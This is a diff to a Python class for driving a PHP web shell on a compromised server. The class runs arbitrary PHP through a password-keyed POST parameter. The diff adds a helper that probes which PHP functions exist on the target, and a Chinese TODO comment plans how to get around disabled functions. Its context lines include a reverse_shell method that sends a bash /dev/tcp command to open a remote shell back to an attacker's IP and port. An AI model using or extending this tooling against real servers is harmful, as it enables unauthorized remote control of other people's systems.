@@ -99,7 +99,7 @@ class WebShell():
             Log.error("The connection is aborted!")
             return (False, "The connection is aborted!")
 
-    def php_code_exec(self, function, code):
+    def php_code_exec(self, code):
         try:
             if self.method == "POST":
                 data = {self.password:code}
@@ -114,10 +114,6 @@ class WebShell():
         except:
             Log.error("The connection is aborted!")
             return (False, "The connection is aborted!")
-
-    def check_function_enable(self, function_name):
-        # TODO
-        pass
 
     def auto_exec(self, command):
         # TODO 根据当前环境 , 结合被禁用的函数 , 自动判断使用哪个函数进行命令执行
@@ -146,3 +142,17 @@ class WebShell():
 
     def reverse_shell(self, ip, port):
         return self.auto_exec("bash -c 'sh -i >&/dev/tcp/%s/%s 0>&1'" % (ip, port))
+
+    def check_function_exist(self, function_name):
+        result = self.php_code_exec('var_dump(function_exists(%s));' % (function_name))
+        if result[0]:
+            content = result[1]
+            if "bool(true)" in content:
+                Log.success("The function [%s] is existed!" % (function_name))
+                return True
+            else:
+                Log.error("The function [%s] is not existed!" % (function_name))
+                return False
+        else:
+            Log.error("Some error occured when exec php code...")
+            return False
